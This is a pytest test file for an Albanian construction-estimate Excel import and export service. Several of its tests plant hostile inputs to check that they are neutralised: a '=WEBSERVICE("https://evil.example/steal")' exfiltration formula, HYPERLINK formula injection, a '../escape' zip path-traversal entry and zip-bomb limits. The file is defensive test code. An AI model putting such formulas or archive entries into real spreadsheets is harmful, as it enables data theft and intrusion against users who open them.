from decimal import Decimal
from io import BytesIO
from zipfile import ZipFile, ZIP_DEFLATED

import pytest
from openpyxl import Workbook, load_workbook

from app.services.excel import (
    inspect_workbook,
    import_rows,
    export_standard,
    export_original,
)


def make_book(layout=1):
    book = Workbook()
    sheet = book.active
    sheet.title = "Punimet"
    if layout == 1:
        sheet.append(["Preventivi për ndërtim"])
        sheet.append(["Nr.", "Përshkrimi", "Njësia", "Sasia", "Çmimi", "Vlera"])
        sheet.append(["1.01", "Beton C25/30", "m³", "1,25", "125,50", None])
        sheet.append(["2", "Kapitulli elektrik", None, None, None, None])
        sheet.append(["3", "Kabllo", "m", -1, None, None])
        sheet.append([None, "Nëntotal", None, 2, None, 99])
        sheet.append([None, None, None, None, None, None])
    else:
        sheet.append(["Code", "Quantity", "Description", "Unit", "No"])
        sheet.append(["FV-01", 4, "Furnizim i paneleve FV 550 Wp", "copë", "A.1"])
    data = BytesIO()
    book.save(data)
    return data.getvalue()


def test_detect_albanian_headers_and_decimal_quantities():
    data = make_book()
    info = inspect_workbook(data)["sheets"][0]
    assert info["name"] == "Punimet"
    assert info["header_row"] == 1
    assert info["suggested_mapping"]["description"] == 1
    result = import_rows(data, "Punimet", info["suggested_mapping"], info["header_row"])
    assert len(result["rows"]) == 1
    row = result["rows"][0]
    assert row["quantity"] == Decimal("1.25")
    assert row["existing_unit_price"] == Decimal("125.50")
    assert row["item_number"] == "1.01"
    assert row["description"] == "Beton C25/30"
    assert row["source_row"] == 3
    assert len(result["rejected"]) >= 3


def test_different_column_layout():
    data = make_book(2)
    info = inspect_workbook(data)["sheets"][0]
    result = import_rows(data, "Punimet", info["suggested_mapping"])
    assert result["rows"][0]["code"] == "FV-01"
    assert result["rows"][0]["quantity"] == Decimal("4")
    assert result["rows"][0]["item_number"] == "A.1"


def test_manual_mapping_and_validation():
    with pytest.raises(ValueError, match="Hartoni"):
        import_rows(make_book(), "Punimet", {"description": 1})
    with pytest.raises(ValueError, match="veçantë"):
        import_rows(
            make_book(), "Punimet", {"description": 1, "unit": 1, "quantity": 2}
        )
    with pytest.raises(ValueError, match="Fleta"):
        import_rows(
            make_book(), "missing", {"description": 1, "unit": 2, "quantity": 3}
        )


def test_standard_export_roundtrip_and_missing_price():
    data = export_standard(
        {"name": "Projekti Ë", "currency": "ALL"},
        [
            {
                "item_number": "1.01",
                "description": "Çelik",
                "unit": "kg",
                "quantity": Decimal("1.25"),
                "unit_price": Decimal("125.50"),
            },
            {
                "item_number": "A2",
                "description": '=HYPERLINK("https://bad")',
                "unit": "copë",
                "quantity": Decimal(1),
                "unit_price": None,
            },
        ],
        {
            "subtotal": Decimal("156.88"),
            "vat": Decimal("31.38"),
            "grand_total": Decimal("188.26"),
        },
    )
    book = load_workbook(BytesIO(data), data_only=False)
    sheet = book["Preventivi"]
    assert sheet["B2"].value == "Çelik"
    assert str(sheet["F2"].value) == "156.88"
    assert sheet["B3"].data_type == "s"
    assert sheet["B3"].value.startswith("'=")
    assert sheet["E3"].value is None
    assert "Pa çmim" in sheet["G3"].value
    assert book["Përmbledhje"]["B2"].value == "Projekti Ë"


def test_original_export_retains_layout_and_does_not_modify_source():
    data = make_book()
    info = inspect_workbook(data)["sheets"][0]
    rows = import_rows(data, "Punimet", info["suggested_mapping"], 1)["rows"]
    rows[0]["unit_price"] = Decimal("125.50")
    exported = export_original(data, "Punimet", rows, info["suggested_mapping"], 1)
    book = load_workbook(BytesIO(exported))
    assert book["Punimet"]["A1"].value == "Preventivi për ndërtim"
    assert book["Punimet"]["B3"].value == "Beton C25/30"
    assert book["Punimet"]["E3"].value == 125.5
    assert book["Punimet"]["F3"].value == 156.88
    assert (
        import_rows(data, "Punimet", info["suggested_mapping"], 1)["rows"][0][
            "existing_total"
        ]
        is None
    )
    with ZipFile(BytesIO(exported)) as archive:
        assert not any("vbaProject" in name for name in archive.namelist())


@pytest.mark.parametrize("payload", [b"not Excel", b"", b"PK invalid"])
def test_invalid_upload(payload):
    with pytest.raises(ValueError):
        inspect_workbook(payload)


def test_path_traversal_archive_rejected():
    data = BytesIO()
    with ZipFile(data, "w", ZIP_DEFLATED) as archive:
        archive.writestr("../escape", "bad")
        archive.writestr("xl/workbook.xml", "bad")
    with pytest.raises(ValueError, match="pasigurt"):
        inspect_workbook(data.getvalue())


def test_zip_expansion_limit(monkeypatch):
    import app.services.excel as module

    monkeypatch.setattr(module, "MAX_UNCOMPRESSED_BYTES", 5)
    with pytest.raises(ValueError, match="çkompresuar"):
        inspect_workbook(make_book())


def test_formula_quantity_without_cached_value_is_rejected():
    book = Workbook()
    sheet = book.active
    sheet.append(["Description", "Unit", "Quantity"])
    sheet.append(["Item", "kg", "=1+1"])
    data = BytesIO()
    book.save(data)
    result = import_rows(
        data.getvalue(), "Sheet", {"description": 0, "unit": 1, "quantity": 2}
    )
    assert not result["rows"]
    assert result["rejected"][0]["reason"] == "heading_or_missing_quantity"


def test_original_export_disarms_external_formulas_but_preserves_arithmetic():
    book = Workbook()
    sheet = book.active
    sheet.append(["Description", "Unit", "Quantity"])
    sheet.append(["Item", "kg", 1])
    sheet["D2"] = '=WEBSERVICE("https://evil.example/steal")'
    sheet["E2"] = "=SUM(C2:C2)"
    sheet["A2"].hyperlink = "https://evil.example"
    data = BytesIO()
    book.save(data)
    exported = export_original(
        data.getvalue(),
        "Sheet",
        [{"source_row": 2, "quantity": Decimal(1), "unit_price": Decimal(5)}],
        {},
    )
    result = load_workbook(BytesIO(exported), data_only=False)
    assert result["Sheet"]["D2"].data_type == "s"
    assert result["Sheet"]["E2"].data_type == "f"
    assert result["Sheet"]["A2"].hyperlink is None
    assert "SmartEstimate" in result.sheetnames


def test_original_export_clears_existing_price_for_unresolved_row():
    data = make_book()
    info = inspect_workbook(data)["sheets"][0]
    rows = import_rows(data, "Punimet", info["suggested_mapping"], 1)["rows"]
    exported = export_original(data, "Punimet", rows, info["suggested_mapping"], 1)
    result = load_workbook(BytesIO(exported))
    assert result["Punimet"]["E3"].value is None
    assert "Pa çmim" in result["Punimet"]["G3"].value


def test_original_description_whitespace_preserved():
    book = Workbook()
    sheet = book.active
    sheet.append(["Description", "Unit", "Quantity"])
    sheet.append(["  Çelik për armim  ", "kg", 1])
    data = BytesIO()
    book.save(data)
    result = import_rows(
        data.getvalue(), "Sheet", {"description": 0, "unit": 1, "quantity": 2}
    )
    assert result["rows"][0]["description"] == "  Çelik për armim  "


def test_original_export_includes_authoritative_financial_summary():
    data = make_book()
    info = inspect_workbook(data)["sheets"][0]
    rows = import_rows(data, "Punimet", info["suggested_mapping"], 1)["rows"]
    rows[0]["unit_price"] = Decimal("100.00")
    result = export_original(
        data,
        "Punimet",
        rows,
        info["suggested_mapping"],
        1,
        project={"name": "PV në Shkodër", "client": "Klienti", "currency": "EUR"},
        totals={
            "subtotal": "125.00",
            "overhead": "12.50",
            "profit": "13.75",
            "vat": "30.25",
            "grand_total": "181.50",
        },
    )
    book = load_workbook(BytesIO(result))
    summary = book["Përmbledhje financiare"]
    values = {
        row[0].value: row[1].value
        for row in summary.iter_rows()
        if len(row) > 1 and row[0].value
    }
    assert values["Projekti"] == "PV në Shkodër"
    assert values["Monedha"] == "EUR"
    assert Decimal(str(values["TVSH"])) == Decimal("30.25")
    assert Decimal(str(values["Totali përfundimtar"])) == Decimal("181.50")
    assert "SmartEstimate" in book.sheetnames
